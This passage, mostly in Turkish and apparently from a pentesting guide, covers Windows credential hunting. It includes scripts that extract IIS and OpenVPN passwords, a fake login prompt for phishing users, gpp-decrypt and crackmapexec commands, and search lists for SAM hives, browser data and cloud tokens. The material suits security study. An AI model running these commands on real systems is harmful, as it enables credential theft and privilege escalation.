        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarlarında parola ile ilgili değer adlarını saklar. Örneğin, [satıcının kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını belirtirdi. Bir değer adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisini değerlendirmeden önce yüklü sürümü, okunabilir değer verisini, biçimi ve geçerli kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılması ve bu hesap için yetkilendirme gerekir. Şifreli metni ve kurtarılan parolaları rutin envanter çıktısına eklemeyin.

### Korunan sayfalara sahip paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini**, çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifreli olduğunu göstermez. Yalnızca yetkili olduğunuz, ilgili dosyaları inceleyin ve geniş kapsamlı envanter sırasında olası gizli bilgileri yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin mevcut olduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve geçerli hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda saklanan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde saklayabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dizinini uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir betiğe yapılan eklenmiş ya da kaldırılmış başvuruları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı AES anahtarını da şifrelenmiş dizeyi de gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrı olarak sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından yetkiniz kapsamında ilgili içeriği inceleyin; rutin envanter çıktısına gizli bilgileri eklemeyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklara erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine gizli bilgi eklemekten kaçının.

### Özel yerel yönetici parolası rotasyonu

Kurum içinde geliştirilmiş bir parola döndürücü, şifrelenmiş bir yerel yönetici parolasını yerel bir hizmette saklarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında tutabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback üzerinde dinleyen bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulama tek başına ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli metnin yanında erişilebiliyorsa şifrelemeye güvenmeden önce tam anahtar türetme yöntemini inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak deterministik biçimde AES anahtarı türeten bir yöntem bu parolayı korumaya uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik için uygun olmadığını belgeliyor. Kurtarılan herhangi bir parolayı bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş bir blob bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar malzemesini rutin envanter çıktısına eklemeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Dizin veya Entra tabanlı depolama ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; benzer şekilde, [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir indeksi okuyup okuyamayacağına karar verir.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir özel bir eklenti, gömülü hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan gizli bilgileri rutin envanter çıktısına eklemeyin. Bir eklenti yolu tek başına gizli bir bilginin mevcut olduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlar. İlgili dosya ACL'lerini kontrol edin ve yeniden kullanılan kimlik bilgilerini farklı gizli bilgilerle değiştirin. Dizin yapısı için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Geçerli hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerinde](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) parolaların düz metin olarak saklanabileceği veya bu özellikte tutulan bir anahtarla şifrelenebileceği belirtiliyor. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisinin yeniden kullanıldığını kanıtlar. Yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına eklemeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış bağlantı noktalarını ve bağlandığı arayüzü gösterebilir. Openfire genellikle yönetici konsolunu loopback'e bağlar; dinleyici çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmetinin kimliğini birlikte kontrol edin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasına neden olabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli inceleme yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adı verilen Velociraptor sunucu yapılandırmaları, dahili CA'nın `CA.private_key` anahtarını içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun ya da hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı malzeme içerir; bir istemci yapılandırması bulmak sunucu CA'sına erişimi kanıtlamaz. Bazı dağıtımlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` konumudur; farklıysa hizmet için yapılandırılmış yolu kullanın. Geçerli kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten mevcut olduğunu doğrulayın. Özel anahtarı günlüklerde veya envanter çıktısında yazdırmaktan kaçının. Satıcının `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek, veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir erişim yolu sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifreli deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda bulunabilir; dışa aktarılmış bir oturum yedeği `sessions-backup.dat` olarak adlandırılabilir ve başka bir konumda saklanabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parolayla şifrelendiğini ve oturumları, anahtarları, komut dosyalarını, etiketleri ve ilişkileri içerebildiğini belirtir; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depo tanımlanmıştır. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı ssh anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve ssh kullanarak bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedekleme dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'ları da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı hive'ların açığa çıktığını kanıtlamaz ve yaygın `install.wim`, `boot.wim` ve kurtarma imajları çoğunlukla yanıltıcı izlerdir. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajı rehberine](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosya başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Cloud Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesapları dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPO), herhangi bir etki alanı kullanıcısı tarafından erişilebilirdi. İkinci olarak, bu GPP'lerde AES256 ile şifrelenmiş ve varsayılan anahtarı herkesçe bilinen parolaların şifresi, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev, parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları bulmak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arama yapın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec kullanarak parolaları elde etme:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot'undaki yedek arşivleri

Doğrudan web üzerinden sunulan bir webroot'a yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bu durumu bir güvenlik açığı olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalıklar sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Kullanıcının kimlik bilgilerini veya başka bir kullanıcının kimlik bilgilerini bilebileceğini düşünüyorsanız, ondan bunları **her zaman isteyebilirsiniz** (istemciden **kimlik bilgilerini** doğrudan **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek dosya adları**

Bir zamanlar **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmadan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları yaygın olarak `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın bulunması, onu okuyabileceğinizi, kilidini açabileceğinizi veya içinde kayıtlı kimlik bilgilerini kullanabileceğinizi göstermez. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girişte LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) yöntemini değerlendirmeden önce adı geçen hesabı ve NT hash'inin hedefin NTLM hizmeti tarafından hâlâ geçerli kabul edilip edilmediğini doğrulayın. Bir kasa girdisi kendi başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişiminin, hesap haklarının ve ayrı bir hizmet çalıştırma adımının da mevcut olması gerekir. Envanterde veritabanını veya kayıtlı kimlik bilgilerini yazdırmak yerine kasa yolunu ve okunabilirlik durumunu bildirin.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe uzantısı olmayan arama komutu varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Kimlik bilgilerini bulmak için Kutuyu da kontrol etmelisiniz.

